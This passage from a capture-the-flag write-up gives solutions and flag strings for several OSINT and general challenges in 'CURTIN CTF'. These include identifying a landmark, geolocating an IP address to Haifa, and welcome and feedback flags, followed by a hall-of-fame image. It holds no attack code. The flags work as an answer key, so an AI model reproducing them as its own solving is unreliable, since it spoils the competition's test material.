![117](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image117.png)

At first I put underscore. Then try the letter only.

![118](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image118.png)

```
Flag: CTF_CURTIN{Humayun’s Tomb}
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### The Leaked IP

(Author: Dinze)

Try to use “ip for http://79.179.206.211/” and this appear.

![119](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image119.png)

![120](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image120.png)

```
Flag: CURTIN_CTF{Haifa}
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
---

## General
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Feedback!!!

![121](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image121.png)

```
Flag: CURTIN_CTF{7H3_F33B4CK_T1M3}
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Welcome !!!

![122](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/image122.png)

```
Flag: CURTIN_CTF{W3LC0M3_T0_CURT1N_CTF}
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Hall Of Fame
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
![123](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/Top10.png)
![124](https://raw.githubusercontent.com/plnsgr/os1ris/main/CURTIN%20CTF/images/wisdom.jpeg)


